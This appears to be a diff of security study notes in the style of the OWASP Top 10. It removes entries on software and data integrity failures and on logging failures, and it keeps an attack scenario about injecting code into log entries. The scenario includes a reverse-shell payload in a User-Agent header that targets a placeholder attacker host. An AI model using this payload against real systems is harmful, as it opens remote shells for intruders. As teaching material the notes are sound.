@@ -1,22 +1,4 @@
 
-Software and Data Integrity Failures
-- Refer to the lack of provenance and whether a software or data artefact has been tampered since its original creation
-
-Software and Data Integrity Failures Typical Vuln
-- Insufficient verification of data origin and authenticity
-- Missing support for integrity check
-
-Software and Data Integrity Failures Prevention
-- Use digital signatures to verify the source and integrity of software and data artefacts
-- Use integrity checks/signatures when sending serialised data to untrusted clients
-
-Security Logging and Monitoring Failures
-- Relates to the lack of logging, especially application logging, securing the logs against tampering and crucially the lack of log monitoring
-
-Security Logging and Monitoring Failures Typical Vuln
-- Lack of logs for security related events. E.g. No logging of user authentication failures prevents detection of brute-force password
-- No integrity mechanisms in place allow an attacker to cover their tracks
-
 Security Logging and Monitoring Failures Attack Scenario
 - An attacker inserts malicious code into a log file entry by manipulating user input to a web application
 - Injects the code into the user agent string: `User-Agent: Mozilla/5.0; /bin/bash -i >& /dev/tcp/attacker_ip/443 0>&1`
